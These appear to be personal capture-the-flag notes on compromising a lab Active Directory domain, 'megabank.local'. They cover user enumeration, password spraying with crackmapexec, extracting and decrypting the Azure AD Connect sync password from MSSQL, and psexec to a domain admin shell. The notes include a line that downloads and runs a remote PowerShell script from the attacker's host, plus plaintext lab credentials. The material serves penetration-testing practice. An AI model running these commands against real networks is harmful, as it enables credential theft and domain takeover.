nothing on smb
rpcclient found us usernames
`rpcclient -U "" megabank.local -N` `enumdomusers` --> users.txt
user kerbrute to validate users
`./kerbrute userenum --dc 10.129.228.111 -d megabank.local users.txt`

asrep roasting did not give anything
`impacket-GetNPUsers megabank.local/ -dc-ip 10.129.228.111 -usersfile users.txt -format john -outputfile hashes.txt -no-pass`

so we switch to windapsearch to find which users are a part of "Remote Management Users"
`python windapsearch.py -u '' --dc-ip 10.129.228.111 -U -m "Remote Management Users"`
To find the "Account Lockout Threshold", we use enum4linux or `crackmapexec smb IP --pass-pol`
That means, we can now spray passwords across protocols for users. (winrm is only for Remote Management users)

`crackmapexec smb 10.129.228.111  -u users.txt -p english_basic.txt`
SABatchJobs:SABatchJobs

`smbclient \\\\10.129.228.111\\users$ -U 'SABatchJobs' -p 'SABatchJobs'`
got us an azure_uploads.xml

where we get new creds, mhope : 4n0therD4y@n0th3r$
which is the same user with Remote Powershell access.

We see mhope is a member of Azure Admins
Looking around, we find an Microsoft SQL server and Microsoft Azure ADSync
So, ADSync is a tool, used to sync password hashes for you Azure account(aka MS Office) and your logins. The password is encrypted using a static string across products.
The dll that is responsible for handling the synchronisation of password hashes, `Microsoft.Online.PasswordSynchronization.dll`
The password is stored in the MS SQL database server, in the ADSync database,
 table named `mms_management_agent` which contains a number of fields including `private_configuration_xml`  The encrypted password is actually stored within another field, `encrypted_configuration`
So, the sqlcmd would be
`sqlcmd -Q "use ADSync; select private_configuration_xml, encrypted_configuration from mms_management_agent`

We quickly get the encrypted password for the Administrator user.
8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g

To decrypt, we can use their dll's own method that is defined. There is a POC script that connects to the database, pulls the encrypted key, and a few other things required, calls the decrypt function, and gives us the password

Minor cange to be done to the script, because of the way it connects to sql server was done using express-install, the syntax differs a little bit.
In place of 
`$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"`
we do 
`$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=localhost;Integrated Security=true;Initial Catalog=ADSync"`

and run it in the winrm-shell
`IEX(New-Object Net.WebClient).downloadString('10.10.14.34/ADSync_decr.ps1')`
We get Username: administrator
Password: d0m@in4dminyeah!

with these creds, we check with crackmapexc to see if it says pwwn3d, and it does
`crackmapexec smb 10.129.237.163 -u 'administrator' -p 'd0m@in4dminyeah!'`

`impacket-psexec Administrator@10.129.237.163`
